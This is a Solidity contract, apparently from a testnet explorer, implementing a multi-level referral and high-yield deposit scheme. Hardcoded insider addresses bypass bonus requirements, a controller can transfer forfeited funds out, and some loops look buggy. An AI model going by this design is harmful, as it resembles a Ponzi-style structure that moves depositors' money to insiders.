/**
 *Submitted for verification at testnet.snowtrace.io on 2022-12-18
*/

pragma solidity >=0.4.23 <0.6.0;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }
}

contract Matic {
    
    using SafeMath for *;
    
    struct User {
        address upline;
        uint256 referrals;
        uint256 payouts;
        uint256 pool_bonus;
        uint256 match_bonus;
        uint256 direct_bonus;
        uint256 deposit_amount;
        uint256 deposit_payouts;
        uint    deposit_time;
        uint256 total_deposits;
        uint    total_structure;
        uint256 first_level_bussiness;
        uint256 last_withdraw;
        uint    package;
    }
    struct UserExtra {
        uint256 tokens;
        uint256 teambussiness;
    }
    
    modifier onlyController() {
        require(msg.sender == controller, "Only Controllers");
        _;
    }
    modifier onlyDeployer() {
        require (msg.sender == deployer, "Only Deployer");
        _;
    }
    
    address payable deployer;
    address public implementation;

    address payable public owner = 0x6E93406b6315Cc3735A9B279c0FA00581B3FE5C1;
    address payable public token1 = 0xe2d250e87524046f5a48F6460eF43fBe5a1f5A68;
    address payable public controller = 0xa8F15F917Df2d1728933C164FaC68Db81cEE650D;

    address payable public a2 = 0x6Ae15196230657C76b173EFcAbE773Db53051996;
    address payable public a3 = 0xD5f02a941B4ccDEBaC1ceed707c2fcC46fD8f96e;
    
    address payable public b1 = 0xECa2BF1B594e3d419F5A188662A8DE3157b3Ed07;
    address payable public b2 = 0xe282424062cEAB8B0d0d7F1337011825D0FAE1a2;
    address payable public b3 = 0xce29f7283A6cc88d7a0770f65a87d676c056D74F;
    address payable public b4 = 0xeCA93F4Cd1353380C26Fc2Cd460eBaD51dc56B63;

    
    mapping(address => User) public users;
    mapping(address => UserExtra) public userextra;

    uint8[] public ref_bonuses;

    uint8[] public pool_bonuses;
    uint    public pool_last_draw = now;
    uint256 public pool_cycle;
    uint256 public pool_balance;
    uint public payoutPeriod = 1 minutes;
    uint public roiBlock = 30 days;
    mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum;
    mapping(uint8 => address) public pool_top;

    uint256 public total_users = 1;
    uint256 public total_deposited;
    uint256 public total_withdraw;
    
    uint256 public extra_amount;
    
    event Upline(address indexed addr, address indexed upline);
    event NewDeposit(address indexed addr, uint256 amount);
    event DirectBonus(address indexed addr, uint256 amount, address from);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount, uint8 level, uint256 _needed_bussiness);
    event PoolPayout(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event LimitReached(address indexed addr, uint256 amount);

    constructor() public {
        
        deployer = msg.sender;

        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(4);
        ref_bonuses.push(4);
        ref_bonuses.push(4);
        ref_bonuses.push(4);
        ref_bonuses.push(3);
        ref_bonuses.push(3);
        ref_bonuses.push(3);
        ref_bonuses.push(3);
        ref_bonuses.push(3);
        ref_bonuses.push(2);
        ref_bonuses.push(2);
        ref_bonuses.push(2);
        ref_bonuses.push(2);
        ref_bonuses.push(2);

        pool_bonuses.push(60);
        pool_bonuses.push(40);
    }

    function _setUpline(address _addr, address _upline) private {
        if(users[_addr].upline == address(0) && _upline != _addr && _addr != owner && (users[_upline].deposit_time > 0 || _upline == owner)) {
            users[_addr].upline = _upline;
            users[_upline].referrals++;

            emit Upline(_addr, _upline);

            total_users++;

            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                if(_upline == address(0)) break;

                users[_upline].total_structure++;

                _upline = users[_upline].upline;
            }
        }
    }

    function _deposit(address _addr, uint256 _invest, uint256 _tokenable) private {
        require(users[_addr].upline != address(0) || _addr == owner, "No upline");

        if(users[_addr].deposit_time > 0) {
            require(users[_addr].payouts >= this.maxPayoutOf(users[_addr].deposit_amount), "Deposit already exists");
            require(_invest >= users[_addr].deposit_amount, "Bad Amount");
        }
        uint package = 0;

        if(_invest >= 5e17 && _invest <= 200e18){
           package = 1;
        }
        if(_invest >= 201e18){
           package = 2;
        }
        
        users[_addr].payouts = 0;
        users[_addr].deposit_amount = _invest;
        users[_addr].deposit_payouts = 0;
        users[_addr].last_withdraw = now;
        users[_addr].total_deposits += _invest;
        users[_addr].package = package;
        users[_addr].direct_bonus = 0;
        users[_addr].match_bonus = 0;
        users[_addr].pool_bonus = 0;

        total_deposited += _invest;

        userextra[_addr].tokens = _invest * 2;

        address _upline = users[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(_upline == address(0)) break;
            userextra[_upline].teambussiness += _invest;
            _upline = users[_upline].upline;
        }

        if(users[_addr].upline != address(0)){
            uint256 direct_bonus = _invest / 10;
            users[users[_addr].upline].direct_bonus += direct_bonus;

            emit DirectBonus(users[_addr].upline, direct_bonus, _addr);
        }

        emit NewDeposit(_addr, _invest);
        
        if(users[_addr].upline != address(0) && users[_addr].deposit_time == 0) {
            if(_invest > 16e18){
                users[users[_addr].upline].first_level_bussiness += 16e18;
            }
            else {
                users[users[_addr].upline].first_level_bussiness += _invest;
            }
        }

        users[_addr].deposit_time = now;

        _pollDeposits(_addr, _invest);

        if(pool_last_draw + 1 days < now) {
            _drawPool();
        }
        
        token1.transfer(_tokenable);        
    }
    function _pollDeposits(address _addr, uint256 _amount) private {
        pool_balance += _amount / 100;

        address upline = users[_addr].upline;

        if(upline == address(0)) return;
        
        pool_users_refs_deposits_sum[pool_cycle][upline] += _amount;

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == upline) break;

            if(pool_top[i] == address(0)) {
                pool_top[i] = upline;
                break;
            }

            if(pool_users_refs_deposits_sum[pool_cycle][upline] > pool_users_refs_deposits_sum[pool_cycle][pool_top[i]]) {
                for(uint8 j = i + 1; j < pool_bonuses.length; j++) {
                    if(pool_top[j] == upline) {
                        for(uint8 k = j; k <= pool_bonuses.length; k++) {
                            pool_top[k] = pool_top[k + 1];
                        }
                        break;
                    }
                }

                for(uint8 j = uint8(pool_bonuses.length - 1); j > i; j--) {
                    pool_top[j] = pool_top[j - 1];
                }

                pool_top[i] = upline;

                break;
            }
        }
    }
    function _refPayout(address _addr, uint256 _amount) private {
        address up = users[_addr].upline;
        
        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            
            uint256 bonus = _amount * ref_bonuses[i] / 100;
            
            if(up != address(0)) {
                if(up != owner){
                    uint8 _level = i + 1;
                    
                    if(up == a2 || up == a3 || up == b1 || up == b2 || up == b3 || up == b4 || up == 0x9156fE3BD326f77AFc8345628FF4B37b55586EF1) {
                        if(bonus > 0){
                            users[up].match_bonus += bonus;
                            emit MatchPayout(up, _addr, bonus, _level, 0);
                        }
                    }
                    else {
                        uint256 needed_bussiness = _level * 4e18;
                        if(users[up].first_level_bussiness >= needed_bussiness) {
                            if(bonus > 0){
                                users[up].match_bonus += bonus;
                                emit MatchPayout(up, _addr, bonus, _level, needed_bussiness);
                            }
                        }
                        else {
                            extra_amount += bonus;
                        }
                    }                    
                }
                else {
                    extra_amount += bonus;
                }
                
                up = users[up].upline;
            }
            else {
                extra_amount += bonus;
            }
        }
    }

    function _drawPool() private {
        pool_last_draw = now;
        pool_cycle++;

        uint256 draw_amount = pool_balance * 40 / 100;

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;

            uint256 win = draw_amount * pool_bonuses[i] / 100;

            users[pool_top[i]].pool_bonus += win;
            pool_balance -= win;

            emit PoolPayout(pool_top[i], win);
        }
        
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            pool_top[i] = address(0);
        }
    }

    function deposit(address _upline, uint256 _invest, uint256 _tokenable) payable external {
        require(msg.value == _invest + _tokenable, "Bad Amount");
        require(_invest >= 1e18, "Bad Amount Min");

        _setUpline(msg.sender, _upline);
        _deposit(msg.sender, _invest, _tokenable);
    }
    function withdraw() external {
        (uint256 to_payout, uint256 max_payout, uint256 pending_payout) = this.payoutOf(msg.sender);

        require(users[msg.sender].payouts < max_payout, "Full payouts");

        // Deposit payout
        if(to_payout > 0) {
            pending_payout = 0;
            
            if(users[msg.sender].payouts + to_payout > max_payout) {
                to_payout = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].deposit_payouts += to_payout;
            users[msg.sender].payouts += to_payout;
            users[msg.sender].last_withdraw = now;
            _refPayout(msg.sender, to_payout);
        }
        
        // Pool payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].pool_bonus > 0) {
            uint256 pool_bonus = users[msg.sender].pool_bonus;

            if(users[msg.sender].payouts + pool_bonus > max_payout) {
                pool_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].pool_bonus -= pool_bonus;
            users[msg.sender].payouts += pool_bonus;
            to_payout += pool_bonus;
        }
        else {
            users[msg.sender].pool_bonus = 0;
        }

        // Match payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].match_bonus > 0) {
            uint256 match_bonus = users[msg.sender].match_bonus;

            if(users[msg.sender].payouts + match_bonus > max_payout) {
                match_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].match_bonus -= match_bonus;
            users[msg.sender].payouts += match_bonus;
            to_payout += match_bonus;
        }
        else {
            users[msg.sender].match_bonus = 0;
        }

        // Direct Bonus
        if(users[msg.sender].payouts < max_payout && users[msg.sender].direct_bonus > 0) {
            uint256 direct_bonus = users[msg.sender].direct_bonus;

            if(users[msg.sender].payouts + direct_bonus > max_payout) {
                direct_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].direct_bonus -= direct_bonus;
            users[msg.sender].payouts += direct_bonus;
            to_payout += direct_bonus;
        }
        else {
            users[msg.sender].direct_bonus = 0;
        }

        require(to_payout > 0, "Zero payout");


        to_payout = to_payout / 2;

        users[msg.sender].deposit_amount += to_payout;

        total_withdraw += to_payout;

        msg.sender.transfer(to_payout);

        emit Withdraw(msg.sender, to_payout);

        if(users[msg.sender].payouts >= max_payout) {
            users[msg.sender].match_bonus = 0;
            users[msg.sender].pool_bonus = 0;
            
            emit LimitReached(msg.sender, users[msg.sender].payouts);
        }
    }
    
    
    /*
        Only external call
    */
    function maxPayoutOf(uint256 _amount) pure external returns(uint256) {
        return _amount * 22 / 10;
    }

    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout, uint256 pending_payout) {
        max_payout = this.maxPayoutOf(users[_addr].deposit_amount);

        if(users[_addr].payouts < max_payout){
            pending_payout = max_payout - users[_addr].payouts;
        }
        else {
             pending_payout = 0;
        }

        if(users[_addr].deposit_payouts < max_payout) {
            
            if(users[_addr].last_withdraw + roiBlock < now) {
                if(users[_addr].package == 1){
                    payout = (users[_addr].deposit_amount * ((users[_addr].last_withdraw + roiBlock - users[_addr].last_withdraw) / payoutPeriod) / 300);
                }
                else {
                    payout = (users[_addr].deposit_amount * ((users[_addr].last_withdraw + roiBlock - users[_addr].last_withdraw) / payoutPeriod) / 300);
                }
            }
            else {
                if(users[_addr].package == 1){
                    payout = (users[_addr].deposit_amount * ((now - users[_addr].last_withdraw) / payoutPeriod) / 300);
                }
                
                if(users[_addr].package == 2){
                    payout = (users[_addr].deposit_amount * ((now - users[_addr].last_withdraw) / payoutPeriod) / 300);
                }
            }
            

            if(users[_addr].deposit_payouts + payout > max_payout) {
                payout = max_payout - users[_addr].deposit_payouts;
            }
        }
    }
    
    function userInfo(address _addr) view external returns(address upline, uint deposit_time, uint256 deposit_amount, uint256 payouts, uint256 pool_bonus, uint256 match_bonus) {
        return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].pool_bonus, users[_addr].match_bonus);
    }

    function userInfoTotals(address _addr) view external returns(uint256 referrals, uint256 total_deposits) {
        return (users[_addr].referrals, users[_addr].total_deposits);
    }

    function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw, uint _pool_last_draw, uint256 _pool_balance, uint256 _pool_lider) {
        return (total_users, total_deposited, total_withdraw, pool_last_draw, pool_balance, pool_users_refs_deposits_sum[pool_cycle][pool_top[0]]);
    }

    function poolTopInfo() view external returns(address[4] memory addrs, uint256[4] memory deps) {
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;

            addrs[i] = pool_top[i];
            deps[i] = pool_users_refs_deposits_sum[pool_cycle][pool_top[i]];
        }
    }
    function getPoolDrawPendingTime() public view returns(uint) {
        uint remainingTimeForPayout = 0;

        if(pool_last_draw + 1 days >= now) {
            uint temp = pool_last_draw + 1 days;
            remainingTimeForPayout = temp - now;
        }
        return remainingTimeForPayout;
    }
    function getNextPayoutCountdown(address _addr) public view returns(uint256) {
        uint256 remainingTimeForPayout = 0;

        if(users[_addr].deposit_time > 0) {
        
            if(users[_addr].last_withdraw + payoutPeriod >= now) {
                remainingTimeForPayout = (users[_addr].last_withdraw + payoutPeriod).sub(now);
            }
            else {
                uint256 temp = now.sub(users[_addr].last_withdraw);
                remainingTimeForPayout = payoutPeriod.sub((temp % payoutPeriod));
            }

            return remainingTimeForPayout;
        }
    }
    function roiblockcoundown(address _addr) public view returns(uint256) {
        uint256 remainingTimeForPayout = 0;

        if(users[_addr].deposit_time > 0) {
        
            if(users[_addr].last_withdraw + roiBlock >= now) {
                remainingTimeForPayout = (users[_addr].last_withdraw + roiBlock).sub(now);
            }

            return remainingTimeForPayout;
        }
    }
    function setPackage(address _addr, uint _package) 
        external onlyDeployer 
    {
        users[_addr].package = _package;
    }
    function fundTranfer(address payable _addr, uint256 _amount) 
        external onlyController 
    {
        if(extra_amount >= _amount){
            _addr.transfer(_amount); 
            extra_amount = extra_amount - _amount;
        }
           
    }
}